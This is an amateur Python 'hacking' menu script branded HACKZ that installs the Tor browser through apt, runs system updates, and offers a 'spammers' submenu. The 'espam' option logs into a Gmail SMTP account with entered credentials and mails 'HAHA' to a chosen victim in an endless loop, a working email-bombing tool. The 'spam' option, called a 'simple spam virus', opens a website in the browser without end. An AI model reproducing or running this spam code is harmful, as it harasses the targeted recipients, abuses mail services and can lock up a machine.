state=""
from colorama import Fore
import os
import webbrowser
import time

def spam():
    while True:
        webbrowser.open('https://hacks.com')

os.system('clear')
while True:
    if state == "":
        print(Fore.RED + "I ain't responsible for the shi* you do with this.")
        print("-----------------------------------------------------------------------------")
        print(" HH  HH      /=\     |====|  || //  ======= ")
        print(" HH  HH     /   \    ||      ||//      //   ")
        print(" HH--HH    /  /\ \   ||      | |      //    ")
        print(" HH  HH   /  /-\  \  ||      ||\\    //     ")
        print(" HH  HH  /__/   \__\ |----|  || \\  ======= Made by AvexProducts || V.1.0")
        print("------------------------------------------------------------------------------")
    
        print("***Welcome to HACKZ***")
        print("--------------------------------------------------------------------")
        print("[MENU:]                                                        ")
        print("--------------------------------------------------------------------")
        print("[TOR: Type 'tor1' first and then 'tor2' to download tor            ]")
        print("[SPAMMERS: Type 'spammers' to view spammers such as email spammers ]")
        print("[UPDATE SYSTEM: Type 'update' to update your system                ]")
        print("[CREDITS: Type 'credits' to view the credits                       ]")
        print("[UPGRADE SYSTEM: Type 'upgrade' to upgrade your system             ]")
        print("[EXIT: Type 'q' to exit                                            ] ")
        print("--------------------------------------------------------------------")
    elif state == "spammers":
        os.system('clear')
        print("--------------------------------------------------------------------")
        print("[SPAM MENU:]                                             ")
        print("--------------------------------------------------------------------")
        print("[EMAIL SPAMMER: Type 'espam' to email spam                         ]")
        print("[COMPUTER SPAM: Type 'spam' to run a simple spam virus             ]")
        print("[EXIT AND GO BACK TO HOME PAGE: Type 'q' to exit the spam menu     ]")
        print("--------------------------------------------------------------------")

    enter=input("Enter: ")

    if state == "":
        if enter == "tor1":
            os.system('sudo echo "deb http://ftp.debian.org/debian bookworm main contrib" > /etc/apt/sources.list.d/cros.list')
            os.system('sudo apt-get update')
            os.system('sudo apt-get upgrade')
            time.sleep(2)
            os.system('clear')
            state=""
        elif enter == "tor2":
            os.system('sudo echo "deb-src http://ftp.debian.org/debian bookworm main contrib" >> /etc/apt/sources.list.d/cros.list')
            os.system('sudo apt-get update')
            os.system('sudo apt-get upgrade')
            os.system('sudo apt-get install torbrowser-launcher')
            print("TOR BROWSER INSTALLED")
            time.sleep(3)
            os.system('clear')
            state=""
        elif enter == "q":
            os.system('clear')
            break
        elif enter == "update":
            os.system('sudo apt-get update')
            print("SYSTEM UPDATED")
            time.sleep(2)
            os.system('clear')
            state=""
        elif enter == "spammers":
            state="spammers"

        elif enter == "upgrade":
            os.system('sudo apt-get upgrade')
            print("SYSTEM UPGRADED")
            time.sleep(2)
            os.system('clear')
            state=""
        elif enter == "credits":
            print("[MAIN PROGRAMMER AND TESTER: AvexProducts]")
            time.sleep(2)
            os.system('clear')
            state=""
        else:
            print("ERROR. COULD NOT UNDERSTAND")
            time.sleep(3)
            os.system('clear')
            state=""
    elif state == "spammers":
        if enter == "espam":
            import smtplib
            message="HAHA"

            print("EMAIL SPAMMER")
            print("MAKE SURE LESS-SECURE-APPS IS TURNED ON")
            print("What is the email spamming")
            emailsending=input("Enter:")
            print("What is the email being spammed")
            emailspammed=input("Enter :")
            print("What is the email spamming password?")
            password=input("Enter: ")

            while True:
                with smtplib.SMTP('smtp.gmail.com', '587') as smtpserver:
                    smtpserver.ehlo()
                    smtpserver.starttls()
                    smtpserver.ehlo()
                    smtpserver.login(emailsending, password)
                    while True:
                        smtpserver.sendmail(emailsending, emailspammed, message)
                        print("SPAMMING. PRESS 'CTRL+Z' TO STOP THE SPAM.")
                        continue
        elif enter == "spam":
            spam()
            os.system('clear')
            state="spammers"
        elif enter == "q":
            print("LEAVING SPAM MENU")
            time.sleep(2)
            os.system('clear')
            state=""
